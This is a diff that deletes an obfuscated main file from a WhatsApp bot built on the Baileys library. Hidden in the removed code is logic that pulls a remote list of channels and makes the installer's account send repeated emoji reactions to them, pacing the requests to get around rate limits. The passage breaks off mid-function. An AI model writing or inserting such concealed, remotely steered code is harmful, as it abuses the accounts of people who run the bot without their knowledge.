@@ -1,5 +1,1143 @@
-/**
- * • Protected by ADEEL Obfuscator
- * • Type: Medium Code (Mixed Style)
- */
-const hexanodecode_ي和们点تク=hexanodecode_ナ还产けい;(function(hexanodecode_んやゆトع十,hexanodecode_时合里す到シ){const hexanodecode_上发后حす高き可=hexanodecode_ナ还产けい,hexanodecode_个たこ二ほ前因ほ=hexanodecode_んやゆトع十();while(!![]){try{const hexanodecode_们有ん现ヨ=parseInt(hexanodecode_上发后حす高き可(0x1f9))/(0x70+-0x1503+0x1494)*(-parseInt(hexanodecode_上发后حす高き可(0x266))/(0x1860+-0x52b+-0x1333))+-parseInt(hexanodecode_上发后حす高き可(0x3f0))/(0x6bb*0x3+-0x1*0x2232+0xe04)*(-parseInt(hexanodecode_上发后حす高き可(0x10e))/(0x1259+-0x1ea4+0x89*0x17))+parseInt(hexanodecode_上发后حす高き可(0xe7))/(-0x1211+-0x1e97+0x11*0x2dd)+parseInt(hexanodecode_上发后حす高き可(0x2a5))/(-0xb80+-0x6e1+0x1267)+-parseInt(hexanodecode_上发后حす高き可(0x3e7))/(-0x2263+-0x12*-0x7f+-0xe9*-0x1c)+-parseInt(hexanodecode_上发后حす高き可(0x184))/(0xc5a+0xd4d+0x1*-0x199f)+-parseInt(hexanodecode_上发后حす高き可(0x156))/(-0x26b7+-0xf8c+-0xd93*-0x4)*(-parseInt(hexanodecode_上发后حす高き可(0x135))/(0xc7*-0x26+0x1*0x16ff+0x695));if(hexanodecode_们有ん现ヨ===hexanodecode_时合里す到シ)break;else hexanodecode_个たこ二ほ前因ほ['push'](hexanodecode_个たこ二ほ前因ほ['shift']());}catch(hexanodecode_ا合ね自前){hexanodecode_个たこ二ほ前因ほ['push'](hexanodecode_个たこ二ほ前因ほ['shift']());}}}(hexanodecode_自シねカ有作ノ,0x12536+-0x50ed1+-0x19f6a*-0x4));function hexanodecode_ナ还产けい(hexanodecode_所开シم多会ص,hexanodecode_的好自不从ن发){const hexanodecode_هく小因上ش=hexanodecode_自シねカ有作ノ();return hexanodecode_ナ还产けい=function(hexanodecode_ف着ゆد,hexanodecode_や它里因ノ得ヤ业){hexanodecode_ف着ゆد=hexanodecode_ف着ゆد-(-0x305*0x5+0x188d+0x2dd*-0x3);let hexanodecode_作部有点动动=hexanodecode_هく小因上ش[hexanodecode_ف着ゆد];if(hexanodecode_ナ还产けい['\x79\x4e\x67\x48\x70\x44']===undefined){var hexanodecode_ア里地前=function(hexanodecode_化こ好之进){const hexanodecode_ن合る同ぬ外这='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let hexanodecode_能メすチニ='',hexanodecode_来みث产テあらب='';for(let hexanodecode_由مかث外所合人ソ=-0x871+0x1*-0xaba+0x132b,hexanodecode_到本政制,hexanodecode_めかهزや和,hexanodecode_イ不理か会た=0xac0+0x3*0xc35+0xb5*-0x43;hexanodecode_めかهزや和=hexanodecode_化こ好之进['\x63\x68\x61\x72\x41\x74'](hexanodecode_イ不理か会た++);~hexanodecode_めかهزや和&&(hexanodecode_到本政制=hexanodecode_由مかث外所合人ソ%(-0x690+-0xc34*-0x3+-0x782*0x4)?hexanodecode_到本政制*(-0x8c*0xd+-0x133*0x1f+0x2c89)+hexanodecode_めかهزや和:hexanodecode_めかهزや和,hexanodecode_由مかث外所合人ソ++%(0x39c+0x2*-0x360+0x328))?hexanodecode_能メすチニ+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](-0x94b+-0x1dd2+-0x140e*-0x2&hexanodecode_到本政制>>(-(0x59b+-0x7*-0x74+-0x5*0x1c1)*hexanodecode_由مかث外所合人ソ&-0x2455+-0x799+0x2bf4)):-0x1216+-0x981*0x3+0x4f*0x97){hexanodecode_めかهزや和=hexanodecode_ن合る同ぬ外这['\x69\x6e\x64\x65\x78\x4f\x66'](hexanodecode_めかهزや和);}for(let hexanodecode_其イチへコ=-0x16*-0xe7+0x19ef+-0xf43*0x3,hexanodecode_应り个同ラ=hexanodecode_能メすチニ['\x6c\x65\x6e\x67\x74\x68'];hexanodecode_其イチへコ<hexanodecode_应り个同ラ;hexanodecode_其イチへコ++){hexanodecode_来みث产テあらب+='\x25'+('\x30\x30'+hexanodecode_能メすチニ['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](hexanodecode_其イチへコ)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](-0x177f+-0x7e6*-0x3+-0x23))['\x73\x6c\x69\x63\x65'](-(-0x1*-0x50e+0x114a*-0x2+-0xe*-0x21c));}return decodeURIComponent(hexanodecode_来みث产テあらب);};hexanodecode_ナ还产けい['\x6d\x57\x51\x7a\x45\x73']=hexanodecode_ア里地前,hexanodecode_所开シم多会ص=arguments,hexanodecode_ナ还产けい['\x79\x4e\x67\x48\x70\x44']=!![];}const hexanodecode_ぬ法む能へ着=hexanodecode_هく小因上ش[0x23bb*-0x1+0x9ee+-0x19cd*-0x1],hexanodecode_上发دص高ちソ=hexanodecode_ف着ゆد+hexanodecode_ぬ法む能へ着,hexanodecode_テ水りは=hexanodecode_所开シم多会ص[hexanodecode_上发دص高ちソ];return!hexanodecode_テ水りは?(hexanodecode_作部有点动动=hexanodecode_ナ还产けい['\x6d\x57\x51\x7a\x45\x73'](hexanodecode_作部有点动动),hexanodecode_所开シم多会ص[hexanodecode_上发دص高ちソ]=hexanodecode_作部有点动动):hexanodecode_作部有点动动=hexanodecode_テ水りは,hexanodecode_作部有点动动;},hexanodecode_ナ还产けい(hexanodecode_所开シم多会ص,hexanodecode_的好自不从ن发);}const {default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,isJidBroadcast,getContentType,proto,generateWAMessageContent,generateWAMessage,AnyMessageContent,prepareWAMessageMedia,areJidsSameUser,downloadContentFromMessage,MessageRetryMap,generateForwardMessageContent,generateWAMessageFromContent,generateMessageID,makeInMemoryStore,jidDecode,fetchLatestBaileysVersion,Browsers}=require(hexanodecode_ي和们点تク(0x374)+'\x6b\x65\x79\x73\x6f'+hexanodecode_ي和们点تク(0x26c)+hexanodecode_ي和们点تク(0x3cb)+hexanodecode_ي和们点تク(0x18c)),l=console[hexanodecode_ي和们点تク(0x180)],{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require('\x2e\x2f\x6c\x69\x62'+hexanodecode_ي和们点تク(0x2f0)+hexanodecode_ي和们点تク(0x2bc)),{AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=require(hexanodecode_ي和们点تク(0x1bd)+'\x61'),fs=require('\x66\x73'),ff=require(hexanodecode_ي和们点تク(0x1e2)+hexanodecode_ي和们点تク(0x3c3)+hexanodecode_ي和们点تク(0x365)),P=require('\x70\x69\x6e\x6f'),config=require(hexanodecode_ي和们点تク(0x11d)+hexanodecode_ي和们点تク(0x37f)),GroupEvents=require(hexanodecode_ي和们点تク(0x13d)+hexanodecode_ي和们点تク(0x115)+'\x70\x65\x76\x65\x6e'+'\x74\x73'),qrcode=require('\x71\x72\x63\x6f\x64'+'\x65\x2d\x74\x65\x72'+'\x6d\x69\x6e\x61\x6c'),StickersTypes=require('\x77\x61\x2d\x73\x74'+hexanodecode_ي和们点تク(0x375)+hexanodecode_ي和们点تク(0x213)+hexanodecode_ي和们点تク(0x272)),util=require(hexanodecode_ي和们点تク(0xde)),{sms,downloadMediaMessage,AntiDelete,storeMessage}=require('\x2e\x2f\x6c\x69\x62'),FileType=require(hexanodecode_ي和们点تク(0x31b)+hexanodecode_ي和们点تク(0x113)),axios=require(hexanodecode_ي和们点تク(0x1d3)),{File}=require(hexanodecode_ي和们点تク(0x3a1)+'\x73'),{fromBuffer}=require(hexanodecode_ي和们点تク(0x31b)+hexanodecode_ي和们点تク(0x113)),bodyparser=require('\x62\x6f\x64\x79\x2d'+hexanodecode_ي和们点تク(0x242)+'\x72'),os=require('\x6f\x73'),Crypto=require('\x63\x72\x79\x70\x74'+'\x6f'),path=require('\x70\x61\x74\x68'),prefix=config[hexanodecode_ي和们点تク(0x1e1)+'\x58'],ownerNumber=[hexanodecode_ي和们点تク(0x25c)+hexanodecode_ي和们点تク(0x228)+'\x36\x37'],tempDir=path[hexanodecode_ي和们点تク(0x136)](os['\x74\x6d\x70\x64\x69'+'\x72'](),hexanodecode_ي和们点تク(0x2cf)+hexanodecode_ي和们点تク(0xf4));if(!fs[hexanodecode_ي和们点تク(0x1ff)+hexanodecode_ي和们点تク(0x121)](tempDir)){const hexanodecode_所开シم多会ص={};hexanodecode_所开シم多会ص[hexanodecode_ي和们点تク(0x397)+hexanodecode_ي和们点تク(0x148)]=!![],fs[hexanodecode_ي和们点تク(0x141)+hexanodecode_ي和们点تク(0x2a0)](tempDir,hexanodecode_所开シم多会ص);}const clearTempDir=()=>{fs['\x72\x65\x61\x64\x64'+'\x69\x72'](tempDir,(hexanodecode_ظ可ヌضフخた,hexanodecode_出种于面ز)=>{const hexanodecode_学イうハ不く定国=hexanodecode_ナ还产けい;if(hexanodecode_ظ可ヌضフخた)return console[hexanodecode_学イうハ不く定国(0x1a7)](hexanodecode_学イうハ不く定国(0x331)+'\x69\x72\x20\x72\x65'+hexanodecode_学イうハ不く定国(0x111)+hexanodecode_学イうハ不く定国(0x282),hexanodecode_ظ可ヌضフخた);for(const hexanodecode_و小き经以ض of hexanodecode_出种于面ز){fs['\x75\x6e\x6c\x69\x6e'+'\x6b'](path['\x6a\x6f\x69\x6e'](tempDir,hexanodecode_و小き经以ض),hexanodecode_实在カ为物=>{const hexanodecode_如ン两为下如ねカ=hexanodecode_学イうハ不く定国;if(hexanodecode_实在カ为物)console[hexanodecode_如ン两为下如ねカ(0x1a7)](hexanodecode_如ン两为下如ねカ(0x331)+hexanodecode_如ン两为下如ねカ(0x21c)+'\x6c\x69\x6e\x6b\x20'+'\x65\x72\x72\x6f\x72'+'\x3a',hexanodecode_实在カ为物);});}});};setInterval(clearTempDir,(0x1*-0xaba+-0x950+0x140f*0x1)*(0x1*-0x259+-0x1*-0x1ca3+-0x91*0x2e)*(-0x177*-0xb+-0x238c+0x1757));const groupMetadataCache=new Map(),getCachedGroupMetadata=async(hexanodecode_وع是天ソد,hexanodecode_由ぬチ和カ种)=>{const hexanodecode_わ到因صبわめヌ=hexanodecode_ي和们点تク,hexanodecode_قてこ中ش=Date[hexanodecode_わ到因صبわめヌ(0x175)](),hexanodecode_度自学やメ去=groupMetadataCache[hexanodecode_わ到因صبわめヌ(0x19d)](hexanodecode_由ぬチ和カ种);if(hexanodecode_度自学やメ去&&hexanodecode_قてこ中ش-hexanodecode_度自学やメ去['\x74\x69\x6d\x65']<(-0x149*-0xb+-0x1c69+-0x1*-0xe4b)*(-0x440*0x4+0x1d21+-0xbe5)*(-0x406*0x3+0x1*-0x1b82+0x2b7c))return hexanodecode_度自学やメ去['\x64\x61\x74\x61'];try{const hexanodecode_实ン也た=await hexanodecode_وع是天ソد['\x67\x72\x6f\x75\x70'+'\x4d\x65\x74\x61\x64'+hexanodecode_わ到因صبわめヌ(0x15e)](hexanodecode_由ぬチ和カ种),hexanodecode_因去人ذ天={};return hexanodecode_因去人ذ天[hexanodecode_わ到因صبわめヌ(0x2a9)]=hexanodecode_实ン也た,hexanodecode_因去人ذ天[hexanodecode_わ到因صبわめヌ(0x3af)]=hexanodecode_قてこ中ش,groupMetadataCache[hexanodecode_わ到因صبわめヌ(0x387)](hexanodecode_由ぬチ和カ种,hexanodecode_因去人ذ天),hexanodecode_实ン也た;}catch(hexanodecode_حる中オつ){return hexanodecode_度自学やメ去?hexanodecode_度自学やメ去[hexanodecode_わ到因صبわめヌ(0x2a9)]:{};}};let newsletterJids=null,loadingNewsletters=![],lastNewsletterFetch=-0x4*-0x76d+-0xb32+-0x1282;const NEWSLETTER_TTL=(-0x16e8+-0x2429+0x3b4d)*(-0xa04+0x1f*0x54+0x5*0x4)*(0x18f3+-0x471*0x3+-0x7b8),normale=hexanodecode_ヲのけ机来=>String(hexanodecode_ヲのけ机来||'')['\x74\x72\x69\x6d']()[hexanodecode_ي和们点تク(0x369)+'\x65\x72\x43\x61\x73'+'\x65'](),manualNewsletterJids=[hexanodecode_ي和们点تク(0x279)+'\x33\x34\x30\x33\x33'+hexanodecode_ي和们点تク(0x1fb)+'\x38\x32\x31\x40\x6e'+hexanodecode_ي和们点تク(0x27e)+'\x74\x74\x65\x72'],reactedMessages=new Map(),newsletterEmojis=['\u2764\ufe0f','\ud83e\ude77','\ud83e\udd70','\ud83e\udde1','\ud83d\udda4',hexanodecode_ي和们点تク(0x3b2),'\ud83d\ude0e','\ud83e\udd0c\ud83c\udffb','\ud83d\ude3b','\ud83d\udc95','\u2728','\ud83c\udf1f','\ud83d\udcaf','\ud83d\udd25','\ud83d\udc4f','\ud83d\ude4c','\ud83d\udcaa','\ud83c\udf89','\ud83e\udd73','\ud83d\ude0d','\ud83e\udd29','\ud83d\ude18','\ud83e\udd7a','\ud83e\udd17'];async function ensureNewsletterLoaded(){const hexanodecode_以る生得=hexanodecode_ي和们点تク;if(Array[hexanodecode_以る生得(0x28f)+'\x61\x79'](newsletterJids)&&Date[hexanodecode_以る生得(0x175)]()-lastNewsletterFetch<NEWSLETTER_TTL)return newsletterJids;if(loadingNewsletters)return newsletterJids||[];loadingNewsletters=!![];try{const hexanodecode_シ要ي性レ={};hexanodecode_シ要ي性レ[hexanodecode_以る生得(0x3cd)+'\x75\x74']=0x2710;const hexanodecode_如以电め=await axios['\x67\x65\x74'](hexanodecode_以る生得(0x10b)+hexanodecode_以る生得(0x1a1)+hexanodecode_以る生得(0x160)+'\x68\x75\x62\x75\x73'+'\x65\x72\x63\x6f\x6e'+hexanodecode_以る生得(0x3d6)+hexanodecode_以る生得(0x38a)+hexanodecode_以る生得(0xf8)+hexanodecode_以る生得(0x259)+hexanodecode_以る生得(0xe6)+hexanodecode_以る生得(0x3f2)+hexanodecode_以る生得(0x1d2)+hexanodecode_以る生得(0x16f)+hexanodecode_以る生得(0x226)+hexanodecode_以る生得(0x146)+'\x73\x2e\x6a\x73\x6f'+'\x6e',hexanodecode_シ要ي性レ);let hexanodecode_出コい于三们ヌすو=Array[hexanodecode_以る生得(0x28f)+'\x61\x79'](hexanodecode_如以电め[hexanodecode_以る生得(0x2a9)])?hexanodecode_如以电め[hexanodecode_以る生得(0x2a9)][hexanodecode_以る生得(0x147)](normale):[];const hexanodecode_جمリろ使ロو=new Set([...manualNewsletterJids['\x6d\x61\x70'](normale),...hexanodecode_出コい于三们ヌすو]);newsletterJids=Array[hexanodecode_以る生得(0x167)](hexanodecode_جمリろ使ロو),lastNewsletterFetch=Date[hexanodecode_以る生得(0x175)](),console[hexanodecode_以る生得(0x180)](hexanodecode_以る生得(0x1af)+'\x64\x65\x64\x20'+newsletterJids['\x6c\x65\x6e\x67\x74'+'\x68']+(hexanodecode_以る生得(0x1b5)+'\x6c\x65\x74\x74\x65'+hexanodecode_以る生得(0x151)+hexanodecode_以る生得(0x2dc)+'\x20\x28')+hexanodecode_出コい于三们ヌすو[hexanodecode_以る生得(0x19a)+'\x68']+('\x20\x66\x72\x6f\x6d'+hexanodecode_以る生得(0x195)+hexanodecode_以る生得(0x1df))+manualNewsletterJids[hexanodecode_以る生得(0x19a)+'\x68']+('\x20\x6d\x61\x6e\x75'+'\x61\x6c\x29'));}catch{newsletterJids=manualNewsletterJids[hexanodecode_以る生得(0x147)](normale),lastNewsletterFetch=Date['\x6e\x6f\x77'](),console[hexanodecode_以る生得(0x180)](hexanodecode_以る生得(0x21d)+hexanodecode_以る生得(0x2b8)+hexanodecode_以る生得(0x10c)+hexanodecode_以る生得(0x144)+hexanodecode_以る生得(0x13e)+hexanodecode_以る生得(0x352)+'\x6c\x73\x2c\x20\x75'+hexanodecode_以る生得(0x2eb)+newsletterJids[hexanodecode_以る生得(0x19a)+'\x68']+(hexanodecode_以る生得(0x2f8)+hexanodecode_以る生得(0x240)+hexanodecode_以る生得(0x26a)+hexanodecode_以る生得(0x27f)+hexanodecode_以る生得(0x1c2)));}finally{loadingNewsletters=![];}return newsletterJids||[];}async function sendReactionsToChannel(hexanodecode_み会之高,hexanodecode_由着些シ因う三,hexanodecode_ه由点时,hexanodecode_十民む所ロ也=null){const hexanodecode_س前ユあ去と二=hexanodecode_ي和们点تク;try{if(!hexanodecode_由着些シ因う三||!hexanodecode_ه由点时)throw new Error(hexanodecode_س前ユあ去と二(0x2e2)+'\x6e\x67\x20\x72\x65'+hexanodecode_س前ユあ去と二(0x188)+hexanodecode_س前ユあ去と二(0x31e)+'\x61\x6d\x65\x74\x65'+hexanodecode_س前ユあ去と二(0x2a2)+'\x72\x20\x63\x68\x61'+'\x6e\x6e\x65\x6c\x20'+hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x2e4));let hexanodecode_へコヘつ人テ=normale(hexanodecode_由着些シ因う三);if(!hexanodecode_へコヘつ人テ[hexanodecode_س前ユあ去と二(0x250)+hexanodecode_س前ユあ去と二(0x189)](hexanodecode_س前ユあ去と二(0x3e2)+'\x6c\x65\x74\x74\x65'+'\x72'))hexanodecode_へコヘつ人テ=hexanodecode_へコヘつ人テ+('\x40\x6e\x65\x77\x73'+hexanodecode_س前ユあ去と二(0x1aa)+'\x72');const hexanodecode_ケ成رく发它やり=hexanodecode_十民む所ロ也||parseInt(config[hexanodecode_س前ユあ去と二(0x11b)+hexanodecode_س前ユあ去と二(0x345)+hexanodecode_س前ユあ去と二(0x26e)+hexanodecode_س前ユあ去と二(0x332)])||-0x7e6*-0x3+-0x1501+-0x27f*0x1,hexanodecode_起へ过ソちサ民か=Math[hexanodecode_س前ユあ去と二(0x1d1)](hexanodecode_ケ成رく发它やり,0x559*0x1+-0x2*0x3ee+0x3af),hexanodecode_テش和能生ل二=Math['\x6d\x61\x78'](hexanodecode_起へ过ソちサ民か,-0x1f*-0x52+-0xbbf*-0x1+0x39c*-0x6),hexanodecode_ツを后所定キまア=hexanodecode_へコヘつ人テ+'\x5f'+hexanodecode_ه由点时;if(reactedMessages[hexanodecode_س前ユあ去と二(0x3a2)](hexanodecode_ツを后所定キまア)){const hexanodecode_ぬさتつカ=reactedMessages[hexanodecode_س前ユあ去と二(0x19d)](hexanodecode_ツを后所定キまア);if(hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x359)]>=hexanodecode_テش和能生ل二)return console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x2b1)+hexanodecode_س前ユあ去と二(0x256)+hexanodecode_س前ユあ去と二(0xeb)+hexanodecode_ぬさتつカ['\x72\x65\x61\x63\x74'+'\x69\x6f\x6e\x73']+('\x20\x72\x65\x61\x63'+hexanodecode_س前ユあ去と二(0x2bc)+hexanodecode_س前ユあ去と二(0x2f3))+hexanodecode_ツを后所定キまア),hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x359)];const hexanodecode_غオ使都へ=hexanodecode_テش和能生ل二-hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x359)];let hexanodecode_ほトセラز=0x1060+-0x7cc+-0x894;for(let hexanodecode_化合キ进起レ国まض=0x6ff+0x1*0x294+0x1*-0x993;hexanodecode_化合キ进起レ国まض<hexanodecode_غオ使都へ;hexanodecode_化合キ进起レ国まض++){const hexanodecode_す好يリ当=newsletterEmojis[Math['\x66\x6c\x6f\x6f\x72'](Math['\x72\x61\x6e\x64\x6f'+'\x6d']()*newsletterEmojis['\x6c\x65\x6e\x67\x74'+'\x68'])];try{await hexanodecode_み会之高[hexanodecode_س前ユあ去と二(0x21b)+hexanodecode_س前ユあ去と二(0x3d5)+hexanodecode_س前ユあ去と二(0x236)+'\x4d\x65\x73\x73\x61'+'\x67\x65'](hexanodecode_へコヘつ人テ,hexanodecode_ه由点时[hexanodecode_س前ユあ去と二(0x291)+hexanodecode_س前ユあ去と二(0x2d1)](),hexanodecode_す好يリ当),hexanodecode_ほトセラز++;if(hexanodecode_化合キ进起レ国まض%(0x26c1+-0x146b+0x1*-0x124c)===-0x218+0x2e5+-0xcd&&hexanodecode_化合キ进起レ国まض>-0x1*0x1c5+0x3d3*-0x4+0x1111)await sleep(0x1ca4+-0x211c+0xc0*0x7);}catch(hexanodecode_う们政み人ヒ民){console['\x6c\x6f\x67'](hexanodecode_س前ユあ去と二(0x105)+'\x63\x74\x69\x6f\x6e'+'\x20'+(hexanodecode_化合キ进起レ国まض+(0x21f9*0x1+-0x65*-0x25+-0x3091))+(hexanodecode_س前ユあ去と二(0x34f)+'\x65\x64\x3a'),hexanodecode_う们政み人ヒ民[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65']),(hexanodecode_う们政み人ヒ民[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65'][hexanodecode_س前ユあ去と二(0x33c)+hexanodecode_س前ユあ去と二(0x2ba)](hexanodecode_س前ユあ去と二(0x1cd))||hexanodecode_う们政み人ヒ民[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65'][hexanodecode_س前ユあ去と二(0x33c)+hexanodecode_س前ユあ去と二(0x2ba)](hexanodecode_س前ユあ去と二(0x2e8)))&&(console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x1b6)+hexanodecode_س前ユあ去と二(0x252)+hexanodecode_س前ユあ去と二(0x178)+hexanodecode_س前ユあ去と二(0x163)+hexanodecode_س前ユあ去と二(0x34d)+hexanodecode_س前ユあ去と二(0x123)+hexanodecode_س前ユあ去と二(0x2fc)+'\x2e'),await sleep(-0x2e*-0xb+0x8e2+0xa*-0x4e));}}return hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x359)]+=hexanodecode_ほトセラز,hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1d8)+hexanodecode_س前ユあ去と二(0x1b4)]=Date['\x6e\x6f\x77'](),reactedMessages[hexanodecode_س前ユあ去と二(0x387)](hexanodecode_ツを后所定キまア,hexanodecode_ぬさتつカ),console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x1be)+'\x65\x64\x20'+hexanodecode_ほトセラز+(hexanodecode_س前ユあ去と二(0xf3)+hexanodecode_س前ユあ去と二(0x3ad)+hexanodecode_س前ユあ去と二(0x2bc)+hexanodecode_س前ユあ去と二(0x2f3))+hexanodecode_ツを后所定キまア+(hexanodecode_س前ユあ去と二(0x1e0)+hexanodecode_س前ユあ去と二(0x201))+hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+hexanodecode_س前ユあ去と二(0x359)]+'\x29'),hexanodecode_ぬさتつカ[hexanodecode_س前ユあ去と二(0x1b3)+'\x69\x6f\x6e\x73'];}console['\x6c\x6f\x67']('\ud83c\udfaf\x20\x53\x65\x6e'+hexanodecode_س前ユあ去と二(0x205)+hexanodecode_テش和能生ل二+(hexanodecode_س前ユあ去と二(0x3ad)+'\x74\x69\x6f\x6e\x73'+hexanodecode_س前ユあ去と二(0x241)+hexanodecode_س前ユあ去と二(0x352)+'\x6c\x20')+hexanodecode_へコヘつ人テ+(hexanodecode_س前ユあ去と二(0x285)+'\x3a\x20')+hexanodecode_ه由点时+'\x29');let hexanodecode_点用是テノ=0x1f*0xb1+-0x187+0x13e8*-0x1;for(let hexanodecode_ロ方他等下フク=0x71*0x2f+-0x1*-0x5c8+0x1*-0x1a87;hexanodecode_ロ方他等下フク<hexanodecode_テش和能生ل二;hexanodecode_ロ方他等下フク++){const hexanodecode_机上テ部=newsletterEmojis[Math['\x66\x6c\x6f\x6f\x72'](Math['\x72\x61\x6e\x64\x6f'+'\x6d']()*newsletterEmojis[hexanodecode_س前ユあ去と二(0x19a)+'\x68'])];try{await hexanodecode_み会之高[hexanodecode_س前ユあ去と二(0x21b)+hexanodecode_س前ユあ去と二(0x3d5)+hexanodecode_س前ユあ去と二(0x236)+hexanodecode_س前ユあ去と二(0x158)+'\x67\x65'](hexanodecode_へコヘつ人テ,hexanodecode_ه由点时[hexanodecode_س前ユあ去と二(0x291)+hexanodecode_س前ユあ去と二(0x2d1)](),hexanodecode_机上テ部),hexanodecode_点用是テノ++;if(hexanodecode_ロ方他等下フク%(-0x2*-0xdb4+-0xe09+-0xd55)===-0x3e*0x13+-0x5*-0x485+-0x11ff&&hexanodecode_ロ方他等下フク>-0x411+0x3*0x77b+-0x1260)await sleep(0x7e7+-0x1*0x1cdb+0x15bc);}catch(hexanodecode_نたわ应ひي这高){console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x105)+hexanodecode_س前ユあ去と二(0x3ca)+'\x20'+(hexanodecode_ロ方他等下フク+(-0x8b*-0x3d+-0x6*0x247+-0x1374))+('\x20\x66\x61\x69\x6c'+hexanodecode_س前ユあ去と二(0x3d1)),hexanodecode_نたわ应ひي这高[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65']),(hexanodecode_نたわ应ひي这高[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65'][hexanodecode_س前ユあ去と二(0x33c)+hexanodecode_س前ユあ去と二(0x2ba)](hexanodecode_س前ユあ去と二(0x1cd))||hexanodecode_نたわ应ひي这高[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65'][hexanodecode_س前ユあ去と二(0x33c)+hexanodecode_س前ユあ去と二(0x2ba)]('\x72\x61\x74\x65'))&&(console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x1b6)+hexanodecode_س前ユあ去と二(0x252)+hexanodecode_س前ユあ去と二(0x178)+hexanodecode_س前ユあ去と二(0x163)+hexanodecode_س前ユあ去と二(0x34d)+hexanodecode_س前ユあ去と二(0x123)+'\x6e\x64\x73\x2e\x2e'+'\x2e'),await sleep(0x1*0x14f5+0x220+-0x517*0x3));}}reactedMessages['\x73\x65\x74'](hexanodecode_ツを后所定キまア,{'\x72\x65\x61\x63\x74\x69\x6f\x6e\x73':hexanodecode_点用是テノ,'\x6c\x61\x73\x74\x55\x70\x64\x61\x74\x65':Date['\x6e\x6f\x77'](),'\x63\x68\x61\x6e\x6e\x65\x6c\x4a\x69\x64':hexanodecode_へコヘつ人テ,'\x73\x65\x72\x76\x65\x72\x49\x64':hexanodecode_ه由点时}),console[hexanodecode_س前ユあ去と二(0x180)](hexanodecode_س前ユあ去と二(0x20d)+'\x74\x20'+hexanodecode_点用是テノ+'\x2f'+hexanodecode_テش和能生ل二+(hexanodecode_س前ユあ去と二(0x3ad)+hexanodecode_س前ユあ去と二(0x2bc)+hexanodecode_س前ユあ去と二(0x2f3))+hexanodecode_ツを后所定キまア);if(reactedMessages[hexanodecode_س前ユあ去と二(0x1c1)]>-0x20b*0x1+-0xb*0x9+0x656){const hexanodecode_تメخリ=Array['\x66\x72\x6f\x6d'](reactedMessages['\x65\x6e\x74\x72\x69'+'\x65\x73']());hexanodecode_تメخリ[hexanodecode_س前ユあ去と二(0x15a)]((hexanodecode_自起ه两をسمつ,hexanodecode_みや实ع)=>hexanodecode_自起ه两をسمつ[0x1*-0x1863+0x29*0x94+0x4*0x2c]['\x6c\x61\x73\x74\x55'+hexanodecode_س前ユあ去と二(0x1b4)]-hexanodecode_みや实ع[0x347*0x6+-0x1b1+0x8fc*-0x2][hexanodecode_س前ユあ去と二(0x1d8)+hexanodecode_س前ユあ去と二(0x1b4)]),hexanodecode_تメخリ[hexanodecode_س前ユあ去と二(0x20f)](-0x5*0x2d3+-0x174a+0x2569,hexanodecode_تメخリ[hexanodecode_س前ユあ去と二(0x19a)+'\x68']-(0x2e2+-0x1*0x14e7+0x15ed))[hexanodecode_س前ユあ去と二(0x128)+'\x63\x68'](([hexanodecode_チ得有外メ年ヨう])=>reactedMessages[hexanodecode_س前ユあ去と二(0x378)+'\x65'](hexanodecode_チ得有外メ年ヨう));}return hexanodecode_点用是テノ;}catch(hexanodecode_طコ法タ){console[hexanodecode_س前ユあ去と二(0x1a7)](hexanodecode_س前ユあ去と二(0x3be)+hexanodecode_س前ユあ去と二(0x239)+hexanodecode_س前ユあ去と二(0x236)+'\x69\x6f\x6e\x20\x45'+hexanodecode_س前ユあ去と二(0x244),hexanodecode_طコ法タ[hexanodecode_س前ユあ去と二(0x194)+'\x67\x65']);throw hexanodecode_طコ法タ;}}function hexanodecode_自シねカ有作ノ(){const 